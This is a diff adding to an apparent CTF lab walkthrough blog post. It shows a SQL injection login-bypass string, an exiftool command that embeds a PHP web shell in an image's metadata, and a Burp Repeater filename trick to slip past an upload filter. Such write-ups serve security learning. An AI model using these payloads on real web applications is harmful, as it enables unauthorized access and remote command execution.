@@ -60,3 +60,11 @@ Password: ' or 1=1 --
 {% endhighlight %}
 
 I tried to upload a PHP reverse shell, but got an error back asking What are you trying to do here!? so obviously it is blocked. By changing .php to .jpg resulted in the same error, so moved on. I downloaded an image from the internet, named it index.jpeg and used exfiltool to make a malicious image file:
+
+{% highlight bash linenos %}
+exiftool -Comment='<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>' index.jpeg
+{% endhighlight %}
+
+Once I uploaded, I used BURP to intercept the image file, and sent to repeater. Once in repeater, I changed the filename to index.php.jpeg and sent the POST forward:
+
+<img src="../images/posts/magic_walkthrough" alt="burp_repeater">
